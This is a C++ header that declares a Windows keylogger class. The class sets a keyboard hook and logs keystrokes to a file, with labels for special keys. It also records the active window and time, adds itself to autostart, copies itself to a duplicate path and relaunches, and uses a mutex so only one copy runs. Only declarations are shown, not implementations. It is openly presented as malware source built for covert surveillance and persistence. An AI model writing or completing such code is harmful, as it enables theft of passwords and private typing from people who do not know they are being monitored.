#pragma once

#include <array>
#include <filesystem>
#include <unordered_map>
#include <Windows.h>

class keylogger
{
public:
    keylogger();
    ~keylogger();

    const HHOOK hook() const { return m_hook; }

    WPARAM run() const;
    void process_key(uint32_t code);

private:
    void create_log();
    void write_to_log(std::wstring_view output) const;

    void set_autostart();
    void start_duplicate_and_exit() const;
    void ensure_single_instance();

    void update_time() const;
    void update_window() const;

    HHOOK m_hook{ };
    HANDLE m_mutex{ };
    std::array<uint8_t, 256> m_keys{ };
    std::filesystem::path m_log_path{ };
    std::filesystem::path m_duplicate_path{ };
    const std::unordered_map<uint32_t, std::wstring_view> m_special_keys{
        { VK_BACK, L" [BACKSPACE] "},
        { VK_RETURN, L" [RETURN] "},
        { VK_SPACE, L" [SPACE] "},
        { VK_TAB, L" [TAB] "},
        { VK_SHIFT, L" [SHIFT] "},
        { VK_LSHIFT, L" [LSHIFT] "},
        { VK_RSHIFT, L" [RSHIFT] "},
        { VK_CONTROL, L" [CTRL] "},
        { VK_LCONTROL, L" [LCTRL] "},
        { VK_RCONTROL, L" [RCTRL] "},
        { VK_MENU, L" [ALT] "},
        { VK_LWIN, L" [LWIN] "},
        { VK_RWIN, L" [RWIN] "},
        { VK_ESCAPE, L" [ESCAPE] "},
        { VK_END, L" [END] "},
        { VK_HOME, L" [HOME] "},
        { VK_LEFT, L" [LEFT] "},
        { VK_RIGHT, L" [RIGHT] "},
        { VK_UP, L" [UP] "},
        { VK_DOWN, L" [DOWN] "},
        { VK_PRIOR, L" [PG_UP] "},
        { VK_NEXT, L" [PG_DOWN] "},
        { VK_OEM_PERIOD, L" [.] "},
        { VK_DECIMAL, L" [.] "},
        { VK_OEM_PLUS, L" [+] "},
        { VK_OEM_MINUS, L" [-] "},
        { VK_ADD, L" [+] "},
        { VK_SUBTRACT, L" [-] "},
        { VK_CAPITAL, L" [CAPSLOCK] "}
    };
} inline g_logger{ };
